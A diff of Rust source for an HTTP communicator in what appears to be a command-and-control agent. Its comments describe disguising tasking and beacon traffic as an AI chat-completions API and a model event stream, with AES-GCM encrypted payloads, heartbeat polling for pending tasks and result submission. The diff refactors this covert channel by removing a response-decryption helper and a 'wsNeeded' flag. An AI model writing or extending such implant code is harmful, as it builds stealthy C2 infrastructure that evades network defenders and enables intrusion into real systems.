@@ -243,21 +243,6 @@ impl HttpCommunicator {
         Ok((status, text))
     }
 
-    /// 从响应壳中提取密文并解密（响应格式与请求一致：`{data_key: b64}`）。
-    fn decrypt_response(&self, resp_body: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
-        let dk = self
-            .profile
-            .as_ref()
-            .map(|p| p.data_key.as_str())
-            .unwrap_or("d");
-        let v: Value = serde_json::from_str(resp_body).map_err(|e| format!("bad response json: {e}"))?;
-        let payload = v
-            .get(dk)
-            .and_then(|p| p.as_str())
-            .ok_or("missing payload in response")?;
-        libra_crypto::decrypt_payload(payload, key)
-    }
-
     // ── AI 通道（v1/chat/completions + SSE）─────────────────────────
 
     /// 通过 AI 通道发送信封并等待 SSE 响应，返回解密后的响应明文。
@@ -341,9 +326,9 @@ impl HttpCommunicator {
     }
 
     /// 打开 SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=）。
-    /// 服务端挂起连接并主动推送任务/wsNeeded（AES-GCM 密文在 data: 行），
+    /// 服务端挂起连接并主动推送任务（AES-GCM 密文在 data: 行），
     /// 30s 注释 keepalive。调用方流式读取 body 逐行解析；401 = 会话丢失。
-    pub async fn open_events(&self, key: &[u8; AES_KEY_SIZE]) -> Result<reqwest::Response, String> {
+    pub async fn open_events(&self, _key: &[u8; AES_KEY_SIZE]) -> Result<reqwest::Response, String> {
         let token = self.session_token.clone().unwrap_or_default();
         let url = format!(
             "{}{}?channel={}",
@@ -507,7 +492,7 @@ impl HttpCommunicator {
         &self,
         _agent_id: &str,
         session_key: Option<&[u8; AES_KEY_SIZE]>,
-    ) -> Result<(Option<AgentTask>, bool), String> {
+    ) -> Result<Option<AgentTask>, String> {
         let key = session_key.ok_or("no session key")?;
         let token = self.session_token.clone().unwrap_or_default();
 
@@ -522,8 +507,6 @@ impl HttpCommunicator {
         let v: Value = serde_json::from_str(&plain)
             .map_err(|e| format!("bad heartbeat payload: {e}"))?;
 
-        let ws_needed = v.get("wsNeeded").and_then(|b| b.as_bool()).unwrap_or(false);
-
         let task = match v.get("pendingTask") {
             Some(task_val) if !task_val.is_null() => {
                 let task_json = serde_json::to_string(task_val)
@@ -532,7 +515,7 @@ impl HttpCommunicator {
             }
             _ => None,
         };
-        Ok((task, ws_needed))
+        Ok(task)
     }
 
     /// 提交任务结果：op=res，走 AI 通道。
